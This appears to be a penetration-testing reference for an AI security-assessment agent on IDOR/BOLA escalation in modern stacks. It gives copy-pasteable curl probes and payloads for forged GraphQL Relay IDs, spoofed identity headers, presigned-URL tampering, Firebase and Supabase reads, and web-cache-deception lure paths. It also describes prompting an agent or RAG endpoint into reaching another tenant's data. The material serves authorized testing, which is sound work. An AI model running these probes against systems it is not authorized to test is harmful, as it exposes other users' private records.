# IDOR / BOLA in Modern Architectures — Escalation Tactics

> Skill: `idor-testing`

This is the escalation reference for IDOR/BOLA in modern stacks — the architecture-specific
tactics the baseline `idor-testing` methodology (swap-the-ID across REST CRUD) misses. The
access-control gap moves out of the obvious `GET /users/{id}` handler and into Relay node
resolvers, gateway-injected identity headers, presigned-URL signers, client-trusted datastores,
LLM/RAG retrieval, WebSocket frames, service-mesh east-west traffic, and CDN cache keys. Each
section below gives a mechanism, a copy-pasteable probe, the root cause, and a Confidence label.

**CWE map:** CWE-639 (canonical IDOR) · CWE-566 (SQL-PK variant) · CWE-862 (missing authz) ·
CWE-863 (incorrect authz) · CWE-284 (pillar) · CWE-602 (client-side enforcement trust).
**Category one-liner:** BOLA (API1) = wrong *object* · BOPLA (API3) = wrong *property* ·
BFLA (API5) = wrong *function*. **Tooling:** route all target-facing requests through
`vigil assess kali exec -- curl ...` (`--technique IDOR` / `--technique AUTH`); generate ID
variants with `vigil assess classify-payload --mutations`; rank batch responses with
`vigil assess anomaly-score`.

---

## GraphQL (beyond `node(id:)` basics)

- [ ] **Relay global-ID decode/forge** (Confidence: High) — A Relay `id` is almost always
  `base64("Type:dbid")` or `gid://service/Type/Id`. The `node(id:)` resolver checks the *type*,
  not *ownership*. Decode, increment, re-encode, refetch. This is the **CVE-2025-31481** class
  (API Platform Core <4.0.22: the default `node` field re-creates a Query op *without* the
  configured `security` checks → any entity refetchable by Relay ID; CVSS 7.5).
  ```bash
  echo VXNlcjoxMzM3 | base64 -d        # -> User:1337
  echo -n 'User:1338' | base64         # -> VXNlcjoxMzM4   (forge the neighbor)
  vigil assess kali exec --technique IDOR -- curl -s -X POST https://target/graphql \
    -H 'Content-Type: application/json' -H 'Authorization: Bearer LOW_PRIV' \
    -d '{"query":"{ node(id:\"VXNlcjoxMzM4\"){ ... on User { id email } } }"}'
  ```
- [ ] **Batched + aliased enumeration in one HTTP request** (Confidence: High) — Aliases and
  JSON-array batching fire N object reads in a single request, defeating per-request rate limits
  and per-request authz logging. Rank the responses with `vigil assess anomaly-score`.
  ```graphql
  # Aliased form (one operation, N objects):
  query { a: order(id:1){total} b: order(id:2){total} c: order(id:3){total} }
  ```
  ```json
  // JSON-array batch form (one HTTP request, N operations):
  [{"query":"{order(id:1){total}}"},{"query":"{order(id:2){total}}"},{"query":"{order(id:3){total}}"}]
  ```
- [ ] **Operation-name / partial-field authz evasion** (Confidence: Med-High) — Gateways that
  authorize on the *operation-name string* or only the *top-level field* can be bypassed by
  renaming the operation or aliasing the field so the guard's pattern no longer matches but the
  resolver still runs.
  ```graphql
  query GetMyProfile { aliasField: adminOnlyUser(id:"1338"){ email role } }
  ```
- [ ] **Mutation-side BOLA** (Confidence: High) — Mutations are far less tested than queries.
  Feed a foreign object ID to a state-changing mutation; also try mass-assigning a privileged
  property (BOPLA).
  ```graphql
  mutation { deleteStorySnaps(id:"1338"){ ok } }
  mutation { updateAddress(userId:"1338", line1:"x"){ id } }
  mutation { updateUser(id:"me", role:"Admin"){ id role } }   # mass-assignment
  ```
- [ ] **Field-suggestion / introspection mapping** (Confidence: High) — Introspection on → dump
  the full type graph. Introspection off → graphql-js "Did you mean" suggestions leak field names
  one query at a time so you can rebuild the schema and find the object-bearing fields to attack.
  ```bash
  vigil assess kali exec -- curl -s -X POST https://target/graphql -H 'Content-Type: application/json' \
    -d '{"query":"{ user(id:1){ doesnotexist } }"}'   # -> "Did you mean 'email', 'ssn'?"
  ```
- [ ] **APQ (persisted query) as a false allowlist** (Confidence: Med) — Automatic Persisted
  Queries is a *performance* feature: clients register arbitrary ops at runtime by sending
  `{query, sha256Hash}`, so an "APQ-protected" endpoint still accepts attacker queries. True
  allowlisting = APQ disabled + a pre-registered, server-side hash list.
  ```bash
  vigil assess kali exec -- curl -s -X POST https://target/graphql -H 'Content-Type: application/json' \
    -d '{"query":"{ node(id:\"VXNlcjoxMzM4\"){ ... on User { email } } }",
         "extensions":{"persistedQuery":{"version":1,"sha256Hash":"<sha256 of the query>"}}}'
  ```

Cross-ref: `agent/skills/graphql-testing/SKILL.md`, `agent/references/payloads/graphql-payloads.md`.

---

## JWT / Claim-Trusting Backends

- [ ] **Gateway-set claim trusted by backend** (Confidence: High) — The edge gateway validates the
  JWT, then injects identity as a plain header (`X-User-Id`, `X-Org-Id`, `x-msft-entra-identity`).
  If the service is reachable directly (pod IP, NodePort, `hostNetwork`, SSRF, a second ingress),
  the attacker sets the header himself — no JWT needed.
  ```bash
  vigil assess kali exec --technique AUTH -- \
    curl -s http://internal-svc.cluster.local/orders -H 'X-User-Id: 1002'
  ```
- [ ] **Audience/issuer/realm confusion cross-service replay** (Confidence: High) — Sibling
  services share an issuer/secret and skip `aud` validation, so a low-priv token is silently
  accepted by an admin or sibling API. Replay the token verbatim against the sibling endpoint;
  vary `iss`/realm if the first replay is rejected.
  ```bash
  vigil assess kali exec --technique AUTH -- \
    curl -s https://admin-api.target/v1/orders/1002 -H 'Authorization: Bearer LOW_PRIV_TOKEN'
  ```
- [ ] **Valid-token + foreign-object pairing (the IDOR-specific JWT variant)** (Confidence: High) —
  `kid`/`jku`/`jwk` injection forges the *principal*; the IDOR variant instead keeps a fully VALID
  token and pairs it with *another tenant's object IDs*. The backend authenticates the principal
  correctly and never checks the object's tenant against the token's `org_id`.
  ```bash
  vigil assess kali exec --technique IDOR -- \
    curl -s https://api.target/v1/documents/OTHER_TENANT_DOC_ID -H 'Authorization: Bearer MY_VALID_TOKEN'
  ```

Cross-ref: `agent/skills/jwt-testing/SKILL.md`, `agent/references/payloads/jwt-payloads.md`.

---

## Signed / Encrypted / Opaque References

- [ ] **Reusable HMAC-signed object refs** (Confidence: High) — `?doc=123&sig=HMAC(123)` where the
  signature covers the *ID* but not the *user*. Swap the ID while keeping a valid sig, or replay a
  leaked signed ref. Request your own signed ref, then test it from a different session.
  ```bash
  # Request your own signed ref, then swap ID / replay cross-session:
  vigil assess kali exec --technique IDOR -- \
    curl -s 'https://target/file?doc=124&sig=<sig issued for doc=123>'
  ```
- [ ] **Presigned URL (S3/GCS/Azure Blob) key/bucket tampering & enumeration** (Confidence: High) —
  The server signs *whatever key the client sends*. Walk the key to a neighbor file; send an
  empty/`/` objectKey to get a signed root LISTING; send an empty bucketName to enumerate ALL
  buckets, then all files. Root cause: user-controlled key/bucket flows into the signer with no
  scoping.
  ```bash
  # Neighbor-file walk (server signs the path you supply):
  vigil assess kali exec --technique IDOR -- curl -s -X POST https://target/api/presign \
    -d '{"bucketName":"app-uploads","objectKey":"pdfs/124/receipt.pdf"}'   # was pdfs/123/...
  # Empty key -> signed listing of the bucket root; empty bucket -> enumerate all buckets:
  vigil assess kali exec --technique IDOR -- curl -s -X POST https://target/api/presign \
    -d '{"bucketName":"","objectKey":""}'
  vigil assess kali exec --technique IDOR -- curl -s 'https://target/download?filePath=/'
  ```
- [ ] **JWE / encrypted-ID malleability** (Confidence: Low — label clearly) — Homegrown "encrypt the
  ID" schemes (ECB, or CBC with no MAC) are malleable. Collect many encrypted IDs and look for
  repeated ECB blocks or reused GCM IVs that betray structure; proper JOSE AEAD resists naive
  bit-flipping, so treat this as a low-probability lead, not a primary tactic.
  ```bash
  # Harvest a corpus of opaque IDs, then inspect for block-level repetition / IV reuse:
  vigil assess kali exec -- curl -s https://target/api/list | grep -oE 'ref=[A-Za-z0-9%+/=._-]+'
  ```

---

## Cloud & Client-Trusted Datastores

- [ ] **Firebase / Firestore direct client access** (Confidence: High) — The *only* control is
  security rules; `allow read, write: if true;` or `if request.auth != null;` (authenticated but no
  owner check) means any user reads/writes any doc by ID. Pull the public Firebase config from the
  app bundle and query collections directly with another doc/user ID.
  ```bash
  # Config (apiKey, projectId) is public-by-design in the app bundle; query a foreign doc by ID:
  vigil assess kali exec --technique IDOR -- curl -s \
    'https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents/users/VICTIM_UID?key=PUBLIC_API_KEY'
  ```
- [ ] **Supabase / PostgREST RLS-off-by-default** (Confidence: High) — Tables ship with Row Level
  Security *disabled* (**CVE-2025-48757**: 303 endpoints across 170 projects unauth-readable). The
  public anon key then reads/writes every row. Probe the REST surface and vary `id`/filters.
  ```bash
  vigil assess kali exec --technique IDOR -- curl -s \
    'https://PROJECT.supabase.co/rest/v1/profiles?select=*' -H 'apikey: PUBLIC_ANON_KEY'
  vigil assess kali exec --technique IDOR -- curl -s \
    'https://PROJECT.supabase.co/rest/v1/profiles?id=eq.1002&select=*' -H 'apikey: PUBLIC_ANON_KEY'
  ```

---

## AI / LLM Product APIs (2024–2026)

- [ ] **Conversation / thread / message ID enumeration** (Confidence: High) — `/conversations/{id}`,
  `/threads/{id}`, `/messages/{id}` without an owner check. UUIDv7 thread IDs are *time-ordered* and
  therefore window-enumerable (see `idor-identifier-prediction.md` for the structure detail). The
  AI-native ancestor is the OpenAI 2023 Redis bug that cross-leaked chat titles/messages between
  users. **CVE-2024-7041** (open-webui memory-edit IDOR) is the same class on a self-hosted product.
  ```bash
  vigil assess kali exec --technique IDOR -- \
    curl -s https://target/api/conversations/01J8XK3T7Q5ZP2 -H 'Authorization: Bearer MY_TOKEN'
  ```
- [ ] **RAG document / file-ref IDOR + cross-tenant retrieval** (Confidence: High) — Two distinct
  bugs: (a) *retrieve-then-authorize* — similarity search returns the top-K chunks *before* the ACL
  filter runs, so another tenant's content surfaces in the answer (Salesforce Einstein 2024 leaked
  cross-tenant KB snippets); (b) *client-supplied `namespace`/`tenant_id`* in the request body —
  forge it to query a victim tenant's vector namespace.
  ```bash
  vigil assess kali exec --technique IDOR -- curl -s -X POST https://target/rag/query \
    -H 'Authorization: Bearer MY_TOKEN' -H 'Content-Type: application/json' \
    -d '{"query":"summarize the latest deals","namespace":"tenant-victim"}'
  ```
- [ ] **Agent / tool execution acting on another user's resource** (Confidence: Med-High) — An
  agentic tool call runs with broad service credentials and does no per-object ownership re-check
  (OWASP Agentic Top 10). Drive the agent, via its prompt/tool args, to operate on a resource ID you
  do not own.
  ```bash
  vigil assess kali exec --technique IDOR -- curl -s -X POST https://target/agent/run \
    -H 'Authorization: Bearer MY_TOKEN' -H 'Content-Type: application/json' \
    -d '{"message":"export invoice 1002 to my email"}'   # 1002 belongs to another user
  ```
  > Headline AI-IDOR breach to cite: **McDonald's McHire / Paradox.ai (2025)** — an enumerable
  > `lead_id` (decrement from 64,185,742 → ~64M) plus weak admin auth exposed ~64M applicant records.

---

## WebSocket / gRPC / SSE / Event-Driven

- [ ] **Connect-time-only authz, no per-message check** (Confidence: High) — Auth happens at the
  handshake; subsequent frames are never re-authorized. Connect low-priv, then send a frame
  targeting a foreign user's channel/object. (Reported as a GraphQL-over-WS IDOR → SQLi → PII chain.)
  ```text
  # After a low-priv WS handshake, push a frame for someone else's resource:
  {"type":"subscribe","channel":"user:1002:notifications"}
  # GraphQL-over-WS subscription start targeting a foreign userId:
  {"id":"1","type":"start","payload":{"query":"subscription{ messages(userId:1002){ body } }"}}
  ```
- [ ] **Message-bus / pub-sub topic IDOR** (Confidence: Med) — Topic names embed object IDs
  (`orders.{orgId}.events`). Subscribe to a forged topic to receive another org's stream.
  ```text
  SUB orders.4711.events    # 4711 is not your org
  ```
- [ ] **gRPC-web protobuf frame tampering** (Confidence: Med) — `Content-Type:
  application/grpc-web-text` is base64-wrapped protobuf. Decode the frame, byte-edit the object-ID
  field, re-encode, replay; per-method object-level authz is frequently missing.
  ```bash
  # Decode/edit/re-encode with grpc-coder / protoscope / buf curl / grpcurl, then replay:
  buf curl --schema ./api.proto -d '{"orderId":"1002"}' \
    https://target/order.v1.OrderService/GetOrder    # 1002 is another user's order
  ```

Cross-ref: `agent/skills/graphql-testing/SKILL.md` (for GraphQL-over-WS subscriptions).

---

## Microservices / Service Mesh / API Gateway

- [ ] **East-west trust of caller-supplied identity headers** (Confidence: High) — An internal
  service trusts the `X-User-Id` the mesh "should" have set, but the service is reachable directly,
  so the attacker supplies it. (Same root cause as the JWT gateway-claim tactic, viewed from the
  east-west side.)
  ```bash
  vigil assess kali exec --technique AUTH -- \
    curl -s http://orders-svc.svc.cluster.local:8080/orders/1002 -H 'X-User-Id: 1002'
  ```
- [ ] **BFF aggregation leaking sibling-service data** (Confidence: Med-High) — The
  Backend-for-Frontend authorizes the *aggregate* request but fans out a client-controlled ID to a
  sibling service that lacks its own object-level check, so the sibling's data leaks through the
  composed response. (Cross-ref `bff-parameter-override` skill.)
  ```bash
  vigil assess kali exec --technique IDOR -- curl -s \
    'https://app.target/bff/dashboard?accountId=1002' -H 'Authorization: Bearer MY_TOKEN'
  ```
- [ ] **No per-object authz on east-west traffic** (Confidence: High) — The mesh enforces *service*
  identity (mTLS) but not *object-level* authz; any in-mesh caller can request any object. Validate
  by issuing the object request from a foothold pod with a valid service identity but a foreign
  object ID.

---

## Caching / CDN (Web Cache Deception × IDOR)

- [ ] **Cache key missing the auth dimension** (Confidence: High) — A response varies by
  `Cookie`/`Authorization` but is served without `Vary` or `Cache-Control: private`, so one user's
  authenticated object is cached and served to the next requester (**CVE-2025-57752**: Next.js image
  optimization caches auth-varying responses cross-user). Probe: fetch an authed object, then refetch
  the same URL with no credentials and compare.
  ```bash
  vigil assess kali exec -- curl -si 'https://target/_next/image?url=%2Fme%2Favatar&w=64&q=75' \
    -H 'Authorization: Bearer VICTIM_TOKEN'                       # warm the cache
  vigil assess kali exec --technique IDOR -- \
    curl -si 'https://target/_next/image?url=%2Fme%2Favatar&w=64&q=75'   # served from cache, no creds
  ```
- [ ] **Path-confusion WCD to capture an authenticated object** (Confidence: High) — Lure the victim
  to a crafted path; the origin serves *their* authenticated object while the CDN caches it under a
  static-looking key the attacker can fetch unauthenticated.
  ```text
  /account/settings/wcd.css            # appended segment the origin ignores, CDN caches as .css
  /account/settings;wcd.css            # Spring matrix-param truncation
  /account/settings%23wcd.css          # origin decodes # and truncates; cache keeps the .css suffix
  /assets/..%2faccount/settings        # path-normalization mismatch (cache vs origin)
  ```
  ```bash
  # After the victim loads the lure URL, the attacker fetches the cached authed object:
  vigil assess kali exec --technique IDOR -- curl -s 'https://target/account/settings/wcd.css'
  ```

Cross-ref: `agent/skills/cache-poisoning/SKILL.md`.

---

## Related

- `agent/references/access-control/idor-identifier-prediction.md` — **sibling**; the identifier
  *structure and prediction* details (ObjectId, UUIDv7, Snowflake layouts and time-window
  enumeration) live there. This file references them rather than duplicating.
- `agent/skills/idor-testing/SKILL.md` — parent skill (baseline REST CRUD swap methodology).
- `agent/skills/graphql-testing/SKILL.md`, `agent/skills/jwt-testing/SKILL.md`,
  `agent/skills/cache-poisoning/SKILL.md` — technique skills for the GraphQL, JWT, and CDN sections.
- `agent/references/api-security/API01-broken-object-level-authz.md` — the REST BOLA/IDOR baseline
  checklist this document escalates from.
- `agent/references/payloads/graphql-payloads.md`, `agent/references/payloads/jwt-payloads.md` —
  existing payload libraries (introspection, batching, `alg:none`, key confusion); cross-referenced,
  not duplicated.

> CVE-citation caveat: product-named CVE roundups are frequently mis-attributed. State the precise
> mechanism and do not hard-code unassigned numbers — e.g., the **PraisonAI workspace IDOR is "CVE
> pending."** Verified CVEs cited above: CVE-2025-31481, CVE-2025-57752, CVE-2025-48757,
> CVE-2024-7041. Incidents without a CVE: OpenAI 2023 Redis cross-user chat leak; Salesforce Einstein
> 2024 cross-tenant RAG snippets; McDonald's McHire / Paradox.ai 2025.
